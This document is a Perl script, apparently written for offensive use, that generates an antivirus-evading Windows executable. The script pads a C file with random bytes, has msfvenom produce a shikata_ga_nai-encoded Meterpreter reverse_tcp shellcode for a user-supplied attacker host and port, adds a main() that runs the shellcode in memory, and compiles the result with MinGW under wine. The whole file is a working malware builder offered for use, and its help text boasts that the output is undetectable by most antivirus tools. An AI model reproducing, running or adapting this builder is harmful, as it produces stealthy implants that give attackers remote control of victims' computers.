#!/usr/bin/perl
# METASPLOIT AV-EVASION PAYLOAD GENERATOR - BY TZ
use strict;
use warnings;
use Getopt::Long;
use File::Basename;

my $basename = basename($0);

# usage information 
sub show_help {
	print <<HELP;
****************************************
METASPLOIT AV-EVASION PAYLOAD GENERATOR
- by TZ

To generate a meterpreter payload 
undetectable by most AVs
****************************************

Usage: ./$basename -h <lhost> -p <lport>

Example: ./$basename -h 10.4.4.159 -p 4444

LHOST and LPORT options are REQUIRED.

Optional options are:
-o	Output EXE name (default is mypayload.exe)
	
HELP
	exit 1;
}

# declare variables
my $output = "mypayload.exe";
my $filename = "base.c";
my $lhost;
my $lport;

GetOptions(
		"h=s" => \$lhost,
		"p=s" => \$lport,
        "f=s" => \$filename,
		"o=s" => \$output,
) or show_help;

!defined $lhost and show_help;
!defined $lport and show_help;

sub printpadheader {
        print MYPADHEADER <<PADHEADER;
// This should be random padding
unsigned char padding[]=
PADHEADER
}

sub printpadding {
	system ("cat /dev/urandom | tr -dc _A-Z-a-z-0-9 | head -c1028 >> " . $filename);
	system ("sed -i '3 s/^/\"/' " . $filename);
}

sub printpadfooter {
		print MYPADFOOTER <<PADFOOTER;
"
;

// Our Meterpreter code goes here
PADFOOTER
}

sub printpayload {
	system ("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" . $lhost . " LPORT=" . $lport . " -b '\\x00\\xff' -e x86\\shikata_ga_nai -i 3 -f c >> " . $filename);
}

sub printpush {
		print MYPUSH <<PUSH;
		
// Push Meterpreter into memory
int main(void) { ((void (*)())buf)();}
PUSH
}

open (MYPADHEADER, '>'.$filename);
print "Printing paddings....\n";
printpadheader();
close (MYPADFOOTER);
printpadding();
open (MYPADFOOTER, '>>'.$filename);
printpadfooter();
close (MYPADFOOTER);
print "Printing payload from msfvenom....\n";
printpayload();
open (MYPUSH, '>>'.$filename);
print "Pushing payload into memory....\n";
printpush();
close (MYPUSH);
print "Compiling our C file and generating exe....\n";
system ("wine /root/.wine/drive_c/MinGW/bin/gcc.exe base.c -o " . $output);
print "Done! AV evading payload generated at ./" . $output . "\nEnjoy!\n";
